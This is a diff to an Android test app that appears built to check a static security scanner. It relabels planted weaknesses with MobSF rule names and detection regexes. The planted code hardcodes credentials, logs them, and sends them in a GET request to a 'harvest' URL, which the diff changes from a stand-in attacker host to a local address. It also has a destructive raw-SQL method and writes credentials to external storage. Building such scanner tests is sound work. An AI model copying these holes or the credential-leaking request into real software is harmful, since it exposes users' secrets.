@@ -17,10 +17,11 @@ import java.net.URL;
 
 public class MainActivity extends AppCompatActivity {
 
-    // VULNERABILITY: Hardcoded Credentials
-    // OWASP Mobile Top 10 2024: M1 (Improper Credential Usage)
-    // MASVS: MASVS-CRYPTO (Hardcoded Cryptographic Keys)
-    // MASTG: MASTG-ANDROID-CRYPT (Testing Hardcoded Credentials)
+    // VULNERABILITY: Hardcoded sensitive information (credentials in source code)
+    // MobSF Rule: android_hardcoded
+    // Pattern: (password\s*=\s*['|"].{1,100}['|"]) | (key\s*=\s*['|"].{1,100}['|"])
+    // input_case: lower | type: Regex
+    // CWE: CWE-312 | OWASP Mobile: M9 | MASVS: storage-14
     public static final String API_KEY = "sk-prod-ABC123hardcodedSecret999";
     public static final String DB_PASSWORD = "admin1234!";
 
@@ -60,21 +61,24 @@ public class MainActivity extends AppCompatActivity {
     }
 
     // VULNERABILITY: Sensitive data leakage via Android logging
-    // OWASP Mobile Top 10 2024: M9 (Insecure Data Storage)
-    // MASVS: MASVS-STORAGE (Data Exposure Through Logging)
-    // MASTG: MASTG-ANDROID-STORE (Testing Logs for Sensitive Data)
+    // MobSF Rule: android_logging
+    // Pattern: Log\.(v|d|i|w|e|f|s)|System\.out\.print|System\.err\.print
+    // input_case: exact | type: Regex
+    // CWE: CWE-532 | OWASP Mobile: (info) | MASVS: storage-3
     private void logCredentials() {
         Log.d(TAG, "App initialized with key: " + API_KEY);
         Log.d(TAG, "DB access with: " + DB_PASSWORD);
     }
 
     // DEAD CODE - reachability test: should NOT be flagged
-    // Simulated Weakness: M1 (Improper Credential Usage) + M5 (Insecure Communication)
-    // MASVS: MASVS-NETWORK-1 (Credential Exfiltration via Cleartext HTTP)
-    // MASTG: MASTG-ANDROID-NET (Testing for Cleartext Traffic)
+    // Simulated MobSF Rule: android_hardcoded (key=... / pass=... pattern)
+    // Pattern: (key\s*=\s*['|"].{1,100}['|"]) | (pass\s*=\s*['|"].{1,100}['|"])
+    // input_case: lower | type: Regex
+    // CWE: CWE-312 | OWASP Mobile: M9 | MASVS: storage-14
+    // Also matches: android_ip_disclosure (IP address in URL)
     private void leakCredentialsToUrl() {
         try {
-            String leakUrl = "http://evil.logger.io/harvest?key=" + API_KEY + "&pass=" + DB_PASSWORD;
+            String leakUrl = "http://10.0.2.2/harvest?key=" + API_KEY + "&pass=" + DB_PASSWORD;
             URL url = new URL(leakUrl);
             HttpURLConnection connection = (HttpURLConnection) url.openConnection();
             connection.setRequestMethod("GET");
@@ -86,9 +90,10 @@ public class MainActivity extends AppCompatActivity {
     }
 
     // DEAD CODE - reachability test: should NOT be flagged
-    // Simulated Weakness: M4 (Insufficient Input/Output Validation)
-    // MASVS: MASVS-CODE (Destructive SQL Execution)
-    // MASTG: MASTG-ANDROID-CODE (Testing for SQL Injection)
+    // Simulated MobSF Rule: android_sql_raw_query
+    // Pattern: android\.database\.sqlite AND (rawQuery\( | execSQL\()
+    // input_case: exact | type: RegexAndOr
+    // CWE: CWE-89 | OWASP Mobile: M7 | MASVS: (none)
     private void nukeDatabase() {
         UserDatabaseHelper helper = new UserDatabaseHelper(this);
         SQLiteDatabase db = helper.getWritableDatabase();
@@ -98,9 +103,10 @@ public class MainActivity extends AppCompatActivity {
     }
 
     // DEAD CODE - reachability test: should NOT be flagged
-    // Simulated Weakness: M9 (Insecure Data Storage)
-    // MASVS: MASVS-STORAGE (Credentials Written to External Storage)
-    // MASTG: MASTG-ANDROID-STORE (Testing Local Storage for Sensitive Data)
+    // Simulated MobSF Rule: android_read_write_external
+    // Pattern: \.getExternalStorage | \.getExternalFilesDir\(
+    // input_case: exact | type: RegexOr
+    // CWE: CWE-276 | OWASP Mobile: M2 | MASVS: storage-2
     @SuppressWarnings("deprecation")
     private void writeCredsToExternalStorage() {
         try {
